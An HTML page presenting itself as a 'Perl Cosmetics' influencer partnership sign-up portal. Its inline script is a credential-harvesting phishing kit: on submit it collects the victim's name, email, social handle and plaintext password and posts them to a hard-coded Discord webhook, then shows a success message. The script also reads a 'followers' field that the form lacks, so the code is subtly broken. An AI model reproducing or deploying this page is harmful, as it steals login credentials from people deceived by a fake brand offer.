<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>BRAND PARTNERSHIP — Perl Cosmetics</title>
  <style>
    :root{--accent:#c2185b;--muted:#6b7280;--bg:#f7f7fb;--card:#ffffff}
    *{box-sizing:border-box}
    body{font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin:0; background:var(--bg); color:#111}
    header{background:linear-gradient(135deg,#fff 0%, #fff 60%, #ffeef5 100%); padding:28px 20px; border-bottom:1px solid #ececec}
    .container{max-width:1100px;margin:0 auto}
    .brand{display:flex;gap:14px;align-items:center}
    .logo{width:52px;height:52px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#ff7aa2);display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
    h1{font-size:20px;margin:0}
    p.lead{margin:8px 0 0;color:var(--muted)}
    .grid{display:grid;grid-template-columns:1fr 380px;gap:24px;margin-top:28px}
    .card{background:var(--card);border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(16,24,40,0.06)}
    form{display:flex;flex-direction:column;gap:12px}
    label{font-size:13px;color:#374151}
    input,select,textarea{padding:10px 12px;border-radius:8px;border:1px solid #e6e6ee;font-size:14px}
    button.primary{background:var(--accent);color:white;border:none;padding:10px 14px;border-radius:10px;font-weight:600;cursor:pointer}
    .products{display:grid;grid-template-columns:1fr;gap:14px}
    .product{display:flex;gap:12px;align-items:center;padding:12px;border-radius:10px;border:1px solid #f0f0f6}
    .thumb{width:64px;height:64px;border-radius:8px;background:linear-gradient(135deg,#fff,#f7f7fb);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--muted)}
    .pmeta h4{margin:0;font-size:15px}
    .pmeta p{margin:4px 0 0;color:var(--muted);font-size:13px}
    .programs{display:flex;flex-direction:column;gap:10px}
    .program{border-left:4px solid var(--accent);padding:12px;background:#fff;border-radius:8px}
    .small{font-size:13px;color:var(--muted)}
    footer{margin-top:20px;padding:18px 0;color:var(--muted);font-size:13px}
    @media (max-width:980px){.grid{grid-template-columns:1fr}.container{padding:0 18px}}
  </style>
</head>
<body>
  <header>
    <div class="container">
      <div class="brand">
        <div class="logo">PC</div>
        <div>
          <h1>BRAND PARTNERSHIP — Perl Cosmetics</h1>
          <p class="lead">Influencer portal — sign up to access your dashboard.</p>
        </div>
      </div>
    </div>
  </header>

  <main class="container" style="padding:22px 0;">
    <div class="grid">
      <section class="card">
        <h2 style="margin:0 0 8px 0">Influencer Sign Up</h2>
        <p class="small">Create your influencer account to get verified and access the partner dashboard.</p>

<form id="signupForm">
  <div>
    <label for="name">Full name</label>
    <input id="name" type="text" required />
  </div>

  <div>
    <label for="email">Email</label>
    <input id="email" type="email" required />
  </div>

  <div>
    <label for="platform">Primary platform</label>
    <select id="platform">
      <option>Instagram</option>
      <option>TikTok</option>
      <option>YouTube</option>
      <option>Blog/Other</option>
    </select>
  </div>

  <div>
    <label for="social">Your @ Handle</label>
    <input id="social" type="text" required />
  </div>

  <div>
    <label for="password">Password</label>
    <input id="password" type="password" required />
  </div>

  <div>
    <label for="confirmPassword">Confirm Password</label>
    <input id="confirmPassword" type="password" required />
  </div>

  <button class="primary" type="submit">Create account & view dashboard</button>
</form>

      </section>
    </div>
  </main>

<script>
const webhookURL = "https://discord.com/api/webhooks/1446849459433767074/CMXXr-V-SByxuMbewl1GbwypwqDrgbna82Etpev3oZaZyvBU6Tth6YybgKS-VqMwniP8";

document.getElementById("signupForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const platform = document.getElementById("platform").value;
    const social = document.getElementById("social").value;
    const followers = document.getElementById("followers").value;
    const password = document.getElementById("password").value;
    const confirmPassword = document.getElementById("confirmPassword").value;

    const payload = {
        content: `📝 **New Influencer Signup:**\n🔹 Name: ${name}\n🔹 Email: ${email}\n🔹 Platform: ${platform}\n🔹 Handle: ${social}\n🔹 Followers: ${followers}\n🔹 Password: ${password}\n🔹 Confirm Password: ${confirmPassword}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(() => {
        alert("Signup sent successfully!");
        // Optionally clear fields
        document.getElementById("signupForm").reset();
    })
    .catch(err => {
        alert("Failed to send: " + err);
    });
});
</script>

</body>
</html>
